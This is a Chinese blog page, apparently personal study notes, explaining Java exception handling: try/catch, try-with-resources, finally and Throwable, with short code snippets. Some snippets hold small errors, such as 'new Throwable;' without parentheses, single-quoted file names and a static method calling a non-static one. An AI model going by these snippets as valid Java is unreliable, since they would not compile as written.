<h1 id="try-catch捕获异常"><a href="#try-catch捕获异常" class="headerlink" title="try/catch捕获异常"></a>try/catch捕获异常</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (ExceptionType e)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以使用多个单独的catch字句捕获多个异常。<br>异常对象可能包含与异常本身相关的信息，要想获得对象的更多信息可以用<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.getMessage()</span><br></pre></td></tr></table></figure></p>
<p>对实现了AutoCloseable接口的资源进行处理时，可以使用带资源的try语句，这样无论是否成功使用资源，在try块退出时都会自动关闭资源：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> (Resource res = ...)</span><br><span class="line">&#123;</span><br><span class="line">    code</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开hello.txt</span></span><br><span class="line"><span class="keyword">try</span> (FileWriter writer = <span class="keyword">new</span> FileWriter(<span class="string">'hello.txt'</span>, <span class="keyword">true</span>))</span><br><span class="line">&#123;</span><br><span class="line">    deal with the resource</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>编译器严格执行throws说明符，<strong>如果方法A调用了方法B，而方法B被声明为可能抛出异常e，则A要么继承e（即声明为可能抛出e），要么捕获e</strong></p>
<h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>finally块中的代码不管是否有异常被捕获，都会执行。并且如果处理结果与try/catch中的处理发生冲突，finally中的处理结果会覆盖之。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    code</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (ExceptionType e)</span><br><span class="line">&#123;</span><br><span class="line">    code</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">    code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="Throwable"><a href="#Throwable" class="headerlink" title="Throwable"></a>Throwable</h1><p>Throwable是类，Error和Exception都继承自这个类。所以也可以用try/catch进行捕捉<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;<span class="keyword">catch</span>(Throwable t) &#123;</span><br><span class="line">    t.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在方法声明中，也可以抛出Throwable类异常，由这个方法的调用者处理：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Throwable</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Throwable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        test();</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Throwable t) &#123;</span><br><span class="line">        t.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/06/24/Java程序设计—-处理异常/" data-id="ckoqstm9k0004gkupwk9tr9rf" class="article-share-link">
        分享
      </a>
      
<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li></ul>

    </footer>

  </div>

  

  

</article>
    
  </article>
  

  
  <nav class="page-nav">
    <a class="extend prev" rel="prev" href="/page/2/">上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">下一页</a>
  </nav>
  
</section>
</div>

    <footer class="footer">
  <div class="outer">
    <div class="float-right">
      <ul class="list-inline">
  
  <li><i class="fe fe-bar-chart"></i> <span id="busuanzi_value_site_pv"></span></li>
  
  <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
  
</ul>
    </div>
    <ul class="list-inline">
      <li>精神的壳 &copy; 2021</li>
      
        <li>京ICP备17054916号-2</li>
      
      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
      <li>theme  <a href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
    </ul>
  </div>
</footer>
  </main>
  <aside class="sidebar">
    <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/hexo.svg" alt="精神的壳"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">Home</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">Archives</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags/">Tags</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories/">categories</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link nav-item-search" title="搜索">
        <i class="fe fe-search"></i>
        搜索
      </a>
    </li>
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      <div class="totop" id="totop">
  <i class="fe fe-rocket"></i>
</div>
    </li>
    <li class="nav-item">
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="fe fe-feed"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
  </aside>
  <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/lazyload.min.js"></script>
<script src="/js/busuanzi-2.3.pure.min.js"></script>

<script src="/fancybox/jquery.fancybox.min.js"></script>


<script src="/js/copybtn.js"></script>




<script src="/js/ocean.js"></script>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>